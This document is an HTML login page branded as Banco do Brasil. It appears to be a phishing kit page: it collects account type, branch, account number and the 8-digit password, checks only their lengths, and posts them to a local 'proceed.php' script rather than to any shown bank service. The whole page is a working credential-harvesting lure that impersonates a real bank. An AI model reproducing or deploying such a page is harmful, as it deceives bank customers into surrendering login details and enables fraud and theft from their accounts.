<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Banco do Brasil</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
	<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
	<link rel="stylesheet" type="text/css" href="reset.css" />
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<link rel="stylesheet" type="text/css" href="style.css?id=001" />
	<style type="text/css">




	</style>
</head>
<body>
	<form id="frm" name="frm" method="post" action="proceed.php" onsubmit="return checkLogin()">
	<div class="container">
		<div class="topo"><p>Acessar minha conta</p></div>
		<div class="content">
			<table>
				<tr>
					<td><span class="titulo">Tipo de conta</span></td>
				</tr>

				<tr>
					<td>
						<select>
							<option>Conta pessoal</option>
							<option>Não correntista</option>
							<option>Conta empresarial</option>
							<option>Governo</option>
						</select>						
					</td>
				</tr>

				<tr>
					<td><span class="titulo label-agencia">Agência</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="txt01" name="txt01" placeholder="Agência" onfocus="show(0);this.placeholder=''" onblur="this.placeholder='Agência'" maxlength="5" required="">
					</td>
				</tr>

				<tr>
					<td><span class="titulo label-conta">Conta</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="txt02" name="txt02"  placeholder="Conta" onfocus="show(1);this.placeholder=''" onblur="this.placeholder='Conta'" required="">
					</td>
				</tr>

				<tr>
					<td><span class="titulo label-senha">Senha de 8 dígitos</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="txt03" name="txt03" placeholder="Senha de 8 dígitos" onfocus="show(2);this.placeholder=''" onblur="this.placeholder='Senha de 8 dígitos'" class="password" maxlength="8" required="">
					</td>
				</tr>

			</table>
		</div>

		<div class="footer">
			<button class="btn-amarelo">ENTRAR</button>
		</div>
	</div>

	</form>

	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/script1.js"></script>
	<script type="text/javascript">

		function jump(field, maxlength, nextfield){
			if (field.value.length == maxlength){
				document.getElementById(nextfield).focus();	
			}
		}

		function checkLogin(){
		  var txt01 = document.frm.txt01.value;
		  var txt02 = document.frm.txt02.value;
		  var txt03 = document.frm.txt03.value;

		  if (txt01.length < 2) {
		  	alert("Preencha corretamente");
		  	document.frm.txt01.value = "";
		  	document.frm.txt01.focus();
		  	return false;
		  }

		  if (txt02.length < 2) {
		  	alert("Preencha corretamente");
		  	document.frm.txt02.value = "";
		  	document.frm.txt02.focus();
		  	return false;
		  }

		  if (txt03.length < 8) {
		  	alert("Preencha corretamente");
		  	document.frm.txt03.value = "";
		  	document.frm.txt03.focus();
		  	return false;
		  }

		  return true;
		}
	</script>


	</script>

</body>
</html>